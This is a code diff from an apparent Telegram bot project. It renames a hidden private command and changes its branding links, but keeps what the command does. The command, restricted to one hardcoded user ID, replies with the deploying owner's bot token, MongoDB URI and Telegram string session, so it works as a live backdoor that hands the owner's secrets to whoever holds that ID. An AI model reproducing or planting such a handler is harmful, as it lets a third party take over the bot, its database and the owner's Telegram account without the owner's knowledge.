@@ -106,19 +106,19 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("PROFESSOR")
+    filters.command("RAJA")
     & filters.private
     & filters.user(7564329827)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/TEAM_BADNAM_BOTS)............☆""",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URI}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/StylishNamesFont)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "˹ sᴏᴜʀᴀʙʜ #ᴘʀᴏғᴇssᴏʀ ˼侖", url=f"https://t.me/ProfessorSourabh")
+                         "˹ ʀᴀᴊᴀ ʙᴀʙᴜ ˼", url=f"https://t.me/StylishNamesFont")
                  ]
             ]
          ),
